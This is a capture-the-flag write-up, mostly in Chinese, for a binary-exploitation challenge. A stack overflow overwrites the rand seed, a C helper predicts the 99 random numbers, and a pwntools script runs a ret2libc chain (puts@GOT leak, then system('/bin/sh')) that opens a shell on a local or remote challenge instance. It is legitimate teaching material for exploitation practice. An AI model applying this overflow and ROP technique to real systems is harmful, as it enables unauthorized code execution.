# Elden Random Challenge

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |no    |

## 解题思路

`buf`是10字节，但读入18字节，因此可以溢出到`seed`，以此控制random的结果，如改为0。
编写c程序，模拟99次应该输入的数据，接着打ret2libc即可

## EXPLOIT

```c
// randint.c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    srand(0);
    for (int i = 0; i < 99; i++) {
        int randint = rand() % 100 + 1;
        printf("%d\n", randint);
    }
    return 0;
}
```

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']

def payload(lo:int):
    global sh
    if lo:
        sh = process('./random')
        libc = ELF('/usr/lib/libc.so.6')
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('47.100.137.175', 31193)
        libc = ELF('./libc.so.6')
    elf = ELF('./random')
    putsPlt = elf.plt['puts']
    putsGot = elf.got['puts']
    popRdiAddr = 0x401423
    myreadAddr = elf.symbols['myread']

    probe = process('./randint')
    nums = []
    for i in range(99):
        nums.append(probe.recvline(False))
    probe.close()

    sh.send(b'RocketDev\0' + p64(0)) # write seed to 0
    for i in range(99):
        sh.recvuntil(b'ber:')
        sh.send(p64(int(nums[i])))
    sh.recvuntil(b'mind.\n')

    # payload 1, leak libc
    sh.sendline(b'0'*0x38 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(myreadAddr))

    putsGotAddr = u64(sh.recvline()[:6] + b'\0\0')
    libcBase = putsGotAddr - libc.symbols['puts']
    shstrAddr = libcBase + next(libc.search(b'/bin/sh'))
    systemAddr = libcBase + libc.symbols['system']
    retAddr = 0x401286
    sleep(0.5)

    # payload 2, invoke system
    sh.sendline(b'0'*0x38 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

    sh.interactive()
```
